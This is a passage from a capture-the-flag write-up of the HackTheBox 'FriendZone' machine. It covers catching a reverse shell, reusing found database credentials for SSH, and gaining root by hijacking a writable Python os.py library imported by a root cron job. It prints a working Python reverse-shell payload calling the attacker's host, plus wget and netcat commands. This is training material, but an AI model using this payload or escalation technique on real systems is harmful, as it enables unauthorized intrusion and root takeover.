REDACTED@th0nkpad-1:~/ctf-challenges/hackthebox/easy/friendzone$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.123] 36994
Linux FriendZone 4.15.0-36-REDACTEDric #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 03:37:26 up 17:22,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Upgrading the shell

```bash
$ which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@FriendZone:/$ ^Z
zsh: suspended  nc -lvnp 9001
                                                                                                                                                                       
REDACTED@th0nkpad-1:~/ctf-challenges/hackthebox/easy/friendzone$ stty raw -echo; fg; reset             
[1]  + continued  nc -lvnp 9001

www-data@FriendZone:/$ stty rows 39
www-data@FriendZone:/$ stty columns 167
www-data@FriendZone:/$ export TERM=xterm
```

* The shell is fully interactive now.

## Machine Enumeration

```bash
www-data@FriendZone:/var/www$ cat mysql_data.conf 
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
```

* Some DB creds found in /var/www/
* friend:Agpyu12!0.213$

```bash
www-data@FriendZone:/opt/server_admin$ cat reporter.py 
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```

* Interesting file in "/opt/server_admin"
* -rwxr--r-- 1 root root  424 Jan 16  2019 reporter.py

```bash
www-data@FriendZone:/$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
friend:x:1000:1000:friend,,,:/home/friend:/bin/bash
```

* Only 1 additional user besides root

## Escalation to user "Friend"

The MySQL creds found in /var/www/mysql_data.conf work for SSH.

```bash
REDACTED@th0nkpad-1:~/ctf-challenges/hackthebox/easy/friendzone$ ssh friend@friendzone.red     
The authenticity of host 'friendzone.red (10.10.10.123)' can't be established.
ED25519 key fingerprint is SHA256:ERMyoo9aM0mxdTvIh0kooJS+m3GwJr6Q51AG9/gTYx4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'friendzone.red' (ED25519) to the list of known hosts.
friend@friendzone.red's password: 
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-REDACTEDric x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

You have mail.
Last login: Thu Jan 24 01:20:15 2019 from 10.10.14.3
friend@FriendZone:~$ id
uid=1000(friend) gid=1000(friend) groups=1000(friend),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
```

## Machine Enumeration as user "friend"

I decided to be lazy and just run linPEAS.

```bash
╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                                        
Sudo version 1.8.21p2
```

* Older sudo version

```bash
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                          
tcp        0      0 10.10.10.123:53         0.0.0.0:*               LISTEN      -                                                                                      
tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 ::1:25                  :::*                    LISTEN      -                   
tcp6       0      0 :::443                  :::*                    LISTEN      -                   
tcp6       0      0 :::445                  :::*                    LISTEN      -                   
tcp6       0      0 :::139                  :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -
```

* There are some ports here listening locally.
* 53 - DNS
* 25 - SMTP (www-data@FriendZone:/$ nc 127.0.0.1 25 220 FriendZone ESMTP Exim 4.90_1 Ubuntu Sat, 19 Aug 2023 04:08:47 +0300)
* 953 - DNS

```bash
╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                                                                 
/usr/bin/crontab                                                                                                                                                       
incrontab Not Found
-rw-r--r-- 1 root root     722 Nov 16  2017 /etc/crontab                                                                                                               

/etc/cron.d:
total 20
drwxr-xr-x  2 root root 4096 Oct  6  2018 .
drwxr-xr-x 89 root root 4096 Sep 13  2022 ..
-rw-r--r--  1 root root  712 Jan 18  2018 php
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--  1 root root  191 Oct  5  2018 popularity-contest

/etc/cron.daily:
total 64
drwxr-xr-x  2 root root 4096 Oct  6  2018 .
drwxr-xr-x 89 root root 4096 Sep 13  2022 ..
-rwxr-xr-x  1 root root  539 Jun 27  2018 apache2
-rwxr-xr-x  1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1176 Nov  3  2017 dpkg
-rwxr-xr-x  1 root root 4128 Jan 28  2018 exim4-base
-rwxr-xr-x  1 root root  372 Aug 21  2017 logrotate
-rwxr-xr-x  1 root root 1065 Apr  7  2018 man-db
-rwxr-xr-x  1 root root  538 Mar  1  2018 mlocate
-rwxr-xr-x  1 root root  249 Jan 25  2018 passwd
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root 3477 Feb 21  2018 popularity-contest
-rwxr-xr-x  1 root root  383 Apr 18  2018 samba
-rwxr-xr-x  1 root root  246 Mar 21  2018 ubuntu-advantage-tools

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Oct  5  2018 .
drwxr-xr-x 89 root root 4096 Sep 13  2022 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Oct  5  2018 .
drwxr-xr-x 89 root root 4096 Sep 13  2022 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x  2 root root 4096 Oct  5  2018 .
drwxr-xr-x 89 root root 4096 Sep 13  2022 ..
-rwxr-xr-x  1 root root  723 Apr  7  2018 man-db
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
```

Quite a few CRON Jobs running.

```bash
2023/08/19 04:28:01 CMD: UID=0    PID=22744  | /bin/sh -c /opt/server_admin/reporter.py 
2023/08/19 04:28:01 CMD: UID=0    PID=22743  | /bin/sh -c /opt/server_admin/reporter.py 
2023/08/19 04:28:01 CMD: UID=0    PID=22742  | /usr/sbin/CRON -f 
```

* Theres a CRON running /opt/server_admin/reporter.py

#### reporter.py

```python
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```

* The script looks solid, nothing jumps out as exploitable currently.

#### linPEAS writable files

```bash
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                      
/dev/mqueue                                                                                                                                                            
/dev/shm
/dev/shm/linpeas.sh
/etc/Development
/etc/Development/lmao.php
/etc/sambafiles
/home/friend
/run/lock
/run/user/1000
/run/user/1000/gnupg
/run/user/1000/systemd
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/usr/lib/python2.7
/usr/lib/python2.7/os.py
/usr/lib/python2.7/os.pyc
/var/lib/php/sessions
/var/mail/friend
/var/spool/samba
/var/tmp
```

* /usr/lib/python2.7/os.py - The script reporter.py has "import os"
* This file os.py is writable by the user "friend"

## Escalation to root

If os.py is replaced by a file containing a reverse shell, escalation to root is possible.

### os.py

```python
----------[SNIP]----------
import pty
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.9",9001))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
s.close()
```
* Add this script to the bottom of os.py

### Catching the shell

```bash
REDACTED@th0nkpad-1:~/ctf-challenges/hackthebox/easy/friendzone$ nc -lvnp 9001
````

```bash
friend@FriendZone:/dev/shm$ wget http://10.10.14.9/os.py
--2023-08-19 04:34:26--  http://10.10.14.9/os.py
Connecting to 10.10.14.9:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 164 [text/x-python]
Saving to: ‘os.py’

os.py                                     100%[====================================================================================>]     164  --.-KB/s    in 0s      

2023-08-19 04:34:26 (11.7 MB/s) - ‘os.py’ saved [164/164]

friend@FriendZone:/dev/shm$ cp os.py /usr/lib/python2.7/os.py
```

```bash
REDACTED@th0nkpad-1:~/ctf-challenges/hackthebox/easy/friendzone$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.123] 37034
root@FriendZone:~# id                                                                                                                                                  
id                                                                                                                                                                     
uid=0(root) gid=0(root) groups=0(root)                                                                                                                                 
root@FriendZone:~# cd /root                                                                                                                                            
cd /root                                                                                                                                                               
root@FriendZone:~# ls                                                                                                                                                  
ls                                                                                                                                                                     
certs  root.txt                                                                                                                                                        
root@FriendZone:~# cat root.txt                                                                                                                                        
cat root.txt                                                                                                                                                           
f2fb26590[REDACTED]
```

